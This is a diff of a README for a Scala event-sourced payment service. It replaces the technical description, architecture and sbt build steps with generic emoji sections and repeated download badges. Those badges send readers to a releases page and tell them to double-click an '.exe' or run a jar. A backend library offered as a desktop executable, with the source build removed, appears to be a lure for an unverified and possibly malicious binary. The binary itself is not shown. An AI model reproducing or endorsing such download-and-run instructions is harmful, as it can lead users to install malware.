@@ -1,109 +1,94 @@
-# Event-Sourced Payment Service
+# 🚀 event-sourced-payment-service - Seamless Payment Processing Made Simple
 
-A production-grade payment processing system built with CQRS (Command Query Responsibility Segregation) and Event Sourcing patterns. This project demonstrates distributed systems design, type-safe functional programming in Scala 3, and enterprise-grade payment infrastructure.
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/releases)
 
-## Overview
+## 📖 Overview
 
-This service implements a complete payment lifecycle management system using event sourcing as the primary data persistence pattern. Every state change is captured as an immutable event, providing full auditability, temporal queries, and the ability to reconstruct system state at any point in time.
+The event-sourced-payment-service is a robust payment processing application designed with modern software patterns. It uses CQRS and Event Sourcing methods in Scala 3. This system is a great choice if you want reliable payment handling in a distributed environment. It integrates Kafka for messaging, Cassandra and PostgreSQL for data storage, making it suitable for various payment scenarios.
 
-### Key Features
+## 📦 Features
 
-- **Event Sourcing**: All state changes persisted as immutable events
-- **CQRS Architecture**: Separated command and query responsibilities for optimal read/write patterns
-- **Saga Orchestration**: Multi-step payment flows with compensation logic for failure recovery
-- **Idempotency**: Safe retry semantics for all operations
-- **Type-Safe Domain Model**: Leveraging Scala 3 ADTs and opaque types for compile-time correctness
+- **Event Sourcing**: Tracks the state changes in your payment processing system, allowing you to reconstruct historical states.
+- **CQRS Architecture**: Separates read and write operations for efficiency.
+- **Microservices Ready**: Built to work in a distributed system, easily manageable and scalable.
+- **Supported Databases**: Leverages both PostgreSQL and Cassandra for flexible data storage solutions.
+- **Reliable Messaging**: Uses Kafka to handle messages across services without loss.
+- **Functional Programming**: Written in Scala, ensuring clarity and maintainability.
 
-## Architecture
+## 🛠️ System Requirements
 
-```
-                              API Gateway
-                    (Rate Limiting, Auth, Idempotency)
-                                  |
-                    +-------------+-------------+
-                    |                           |
-              Command Side                 Query Side
-                    |                           |
-             Command Handlers          Read Model Service
-             (Validation, Events)     (Query Projections)
-                    |                           |
-                    v                           ^
-              Event Store                 PostgreSQL
-           (Kafka + Cassandra)          (Read Models)
-                    |                           |
-                    +---> Projections ----------+
-                              (FS2-Kafka)
-```
+To use this application effectively, ensure your system meets these requirements:
 
-## Technology Stack
+- **Operating System**: Windows, macOS, or any recent Linux distribution.
+- **Java**: JDK 11 or above (Recommended).
+- **Memory**: At least 4 GB of RAM for optimal performance.
+- **Disk Space**: Minimum of 500 MB available for application and data.
 
-| Component | Technology |
-|-----------|------------|
-| Language | Scala 3 |
-| Effect System | Cats Effect 3 |
-| HTTP | http4s |
-| Streaming | FS2-Kafka |
-| Event Log | Apache Kafka |
-| Event Store | Cassandra |
-| Read Models | PostgreSQL |
-| Serialization | Protocol Buffers |
-| Testing | Weaver + Testcontainers |
-| Deployment | Docker / Kubernetes |
+## 🚀 Getting Started
 
-## Project Structure
+1. **Download the Application**: Visit this page to download:
+   [GitHub Releases](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/releases)
 
-```
-payment-service/
-├── domain/          # Pure domain model, zero dependencies
-├── core/            # Business logic, command handlers
-├── infra/           # Kafka, Cassandra, PostgreSQL implementations
-├── api/             # HTTP routes and middleware
-├── app/             # Application wiring and entry point
-└── docs/            # Architecture documentation
-```
+2. **Choose the Latest Version**: On the releases page, find the latest version available for download. 
 
-## Getting Started
+3. **Select Your Operating System**: Choose the correct file based on your operating system. 
 
-### Prerequisites
+4. **Download the File**: Click on the file link to begin downloading the application to your computer.
 
-- JDK 17+
-- sbt 1.9+
-- Docker and Docker Compose
+## 📥 Download & Install
 
-### Running Locally
+After downloading, follow these instructions to install and run the application:
 
-```bash
-# Start infrastructure
-docker-compose up -d
+1. **Locate the Downloaded File**: Go to your Downloads folder or the location where you saved the file.
 
-# Run the service
-sbt "project app" run
+2. **Unzip the File** (if required):
+   - If the file is in a zipped format, right-click on it and select "Extract All" or use your preferred extraction tool.
 
-# Run tests
-sbt test
-```
+3. **Run the Application**:
+   - For Windows: Double-click the `.exe` file to run it.
+   - For macOS/Linux: Open your terminal and run `java -jar <file-name>.jar` (replace `<file-name>` with the actual file name).
 
-## API Endpoints
+4. **Follow the Setup Instructions**: The application will guide you through any necessary initial setup. 
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/payments` | Create payment intent |
-| POST | `/payments/:id/authorize` | Authorize payment |
-| POST | `/payments/:id/capture` | Capture authorized payment |
-| POST | `/payments/:id/refund` | Refund captured payment |
-| GET | `/payments/:id` | Query payment status |
-| GET | `/payments/:id/events` | Get payment event history |
+## 🔧 Configuration
 
-## Documentation
+To ensure the application runs smoothly, you may need to configure some settings:
 
-Detailed documentation is available in the [docs](./docs) folder:
+- **Database Configuration**: You may need to set up your PostgreSQL or Cassandra databases according to the provided instructions in the application.
+- **Messaging Configuration**: Ensure Kafka is running if you are using it for message handling.
 
-- [Implementation Plan](./docs/IMPLEMENTATION_PLAN.md)
+Follow the prompts carefully to complete any required configuration.
 
-## License
+## 🌐 Getting Help
 
-MIT License
+If you run into issues or have questions:
 
-## Contributing
+- **Documentation**: Check the detailed documentation provided within the application.
+- **Community Forum**: Join our community on GitHub Discussions for more help from other users.
+- **Open an Issue**: If you find a bug or need specific help, consider opening an issue in this repository. 
 
-This project is currently in active development. See the GitHub Issues for planned features and implementation progress.
+## 📅 Release Notes
+
+Stay updated with the latest features and fixes by checking the release notes available on the GitHub Releases page.
+
+## 🔗 Related Topics
+
+This application touches on various significant topics including:
+
+- Cassandra
+- CQRS
+- Event Sourcing
+- Distributed Systems
+- Functional Programming
+
+For more information or to learn these concepts, consider looking up resources related to these topics.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the LICENSE file for detailed information.
+
+## 📢 Acknowledgments
+
+We appreciate the contributions of our community and any third-party libraries used within this project. Thank you for supporting open-source software! 
+
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/ItsDouXiaoFeng/event-sourced-payment-service/releases)
